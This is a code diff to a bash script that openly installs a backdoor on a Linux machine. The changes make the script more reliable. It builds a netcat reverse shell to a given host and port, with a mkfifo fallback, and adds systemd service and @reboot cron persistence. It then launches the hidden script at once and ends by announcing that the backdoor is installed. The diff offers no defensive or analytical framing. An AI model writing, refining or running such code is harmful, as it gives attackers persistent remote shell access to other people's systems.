@@ -30,7 +30,7 @@ for dir in "${hidden_dirs[@]}"; do
 done
 
 # Check if 'nc -e' is supported
-if nc -h 2>&1 | grep -q -- "-e "; then
+if command -v nc >/dev/null 2>&1 && nc -h 2>&1 | grep -q "\-e"; then
     shell_command="nc -e /bin/bash $host $port"
 else
     shell_command="mkfifo /tmp/.backpipe; cat /tmp/.backpipe | /bin/bash -i 2>&1 | nc $host $port > /tmp/.backpipe"
@@ -53,7 +53,7 @@ After=network.target
 
 [Service]
 Restart=always
-ExecStart=/bin/bash -c '$hidden_script &'
+ExecStart=/bin/bash -c \"/bin/bash $hidden_script &\"
 
 [Install]
 WantedBy=$( [[ $user_mode -eq 0 ]] && echo "multi-user.target" || echo "default.target")" > "$systemd_path"
@@ -71,12 +71,17 @@ fi
 
 # Add multiple persistence methods
 for path in "${persistence_paths[@]}"; do
-    echo "@reboot $( [[ $user_mode -eq 0 ]] && echo "root" || echo "$USER") /bin/bash -c 'nohup $hidden_script &'" >> "$path"
+    echo "@reboot /bin/bash -c 'nohup $hidden_script &'" >> "$path"
 done
 
 chmod 644 "$systemd_path"
 
-# Run the script immediately
-nohup "$hidden_script" &
+# Run the script immediately if it's valid
+if [[ -f "$hidden_script" && -x "$hidden_script" ]]; then
+    nohup "$hidden_script" &
+else
+    echo "Error: $hidden_script not found or not executable."
+    exit 1
+fi
 
 echo "✅ Backdoor installed successfully! Running as $( [[ $user_mode -eq 0 ]] && echo "root" || echo "user" )."
